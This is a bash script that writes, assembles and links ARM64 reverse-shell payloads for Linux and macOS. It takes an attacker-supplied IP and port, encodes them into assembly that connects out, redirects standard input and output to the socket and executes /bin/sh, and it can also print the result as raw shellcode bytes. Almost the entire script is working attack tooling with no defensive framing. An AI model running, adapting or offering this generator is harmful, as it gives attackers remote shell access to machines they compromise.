#!/bin/bash
# shellcheck disable=SC3010
# shellcheck disable=SC3011
# shellcheck disable=SC3030
# shellcheck disable=SC3037
# shellcheck disable=SC3045
# shellcheck disable=SC3057

assemble() {
    if [[ "$os" == "linux" ]]
    then
    
cat <<EOF > linux-reverseshell.s
.section .text
.global _start
_start:
    mov  x8, #198
    lsr  x1, x8, #7
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337
    mvn  x4, x0

    lsl  x1, x1, #1
    movk x1, #0x$flippedport, lsl #16
    movk x1, #0x$subst1, lsl #32
    movk x1, #0x$subst2, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x2
    mov  x2, #16
    mov  x8, #203
    svc  #0x1337
    lsr  x1, x2, #2
dup3:
    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3
    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48
    str  x3, [sp, #-8]!
    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337
EOF

cat <<EOF > Makefile
%.o: %.s
	as $< -o \$@

all:linux-reverseshell

linux-reverseshell: linux-reverseshell.o
		    ld -o linux-reverseshell linux-reverseshell.o
EOF

    elif [[ "$os" == "osx" ]]
    then
    
cat <<EOF > mac-reverseshell.s 
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337
    mvn  x3, x0
call_connect:
   mov  x1, #0x0210
   movk x1, #0x$flippedport, lsl #16
   movk x1, #0x$subst1, lsl #32 
   movk x1, #0x$subst2, lsl #48 
   str  x1, [sp, #-8]
   mov  x2, #8
   sub  x1, sp, x2
   mov  x2, #16
   mov  x16, #98
   svc  #0x1337
   lsr  x2, x2, #2
call_dup:
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup
call_execve:
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
EOF

cat <<EOF > Makefile
LDFLAGS=-lSystem -syslibroot \`xcrun -sdk macosx --show-sdk-path\` -arch arm64

%.o: %.s
	as $< -o \$@

all:mac-reverseshell

mac-reverseshell: mac-reverseshell.o
		    ld \$(LDFLAGS) -o mac-reverseshell mac-reverseshell.o
EOF

    fi

    make
}

shellcode() {
    bin=$(echo *-reverseshell)
    objcopy -O binary "$bin" "$bin.bin"
    hexdump -v -e '"\\""x" 1/1 "%02x" ""' "$bin.bin"
    echo -e "\n"
}


format() {
    IFS=. read ip1 ip2 ip3 ip4 <<< "$IP"

    hexip1=$(printf '%02X\n' "$ip1")
    hexip2=$(printf '%02X\n' "$ip2")
    hexip3=$(printf '%02X\n' "$ip3")
    hexip4=$(printf '%02X\n' "$ip4")
    hexport=$(printf '%02X\n' "$port")

    v=$hexport 
    flippedport=$(echo "${v:6:2}""${v:4:2}""${v:2:2}""${v:0:2}")

    subst1=("$hexip2""$hexip1")
    subst2=("$hexip4""$hexip3")
}

#- main

IP=$1
if [[ -z $IP ]]
then
    read -p "IP to connect to: " IP
fi

port=$2
if [[ -z $port ]]
then
    read -p "Port to use: " port
fi

unamestr=$(uname)
if [[ "$unamestr" == "Linux" ]]
then
    os="linux"
elif [[ "$unamestr" == "Darwin" ]]
then
    os="osx"
else
    echo "[!] unsupported or unknown OS"
    exit
fi

format
assemble

if [[ $3 == "shellcode" ]]
then
    shellcode
fi
